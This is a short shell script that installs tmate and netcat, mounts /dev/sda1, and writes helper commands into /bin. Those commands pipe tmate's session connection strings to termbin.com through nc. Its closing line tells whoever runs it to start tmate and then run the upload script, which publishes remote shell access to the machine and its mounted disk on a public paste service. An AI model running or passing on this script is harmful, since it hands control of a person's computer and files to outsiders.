apt install tmate  -y                                                                    
apt install netcat   -y                                                                  
apt install nano    -y                                                                   
apt install ssh    -y                                                                    
ssh-keygen                                                                             
echo "tmate show-messages" > io                                                        
echo "  io | io1 " > io2                                                               
echo "nc termbin.com 9999" >io1                                                        
chmod +x *                                                                             
mkdir x                                                                                
cp -r io* /bin                                                                         
mount /dev/sda1 x                                                                      
                                                                                       
echo thanks                                                                            
press tmate then io2
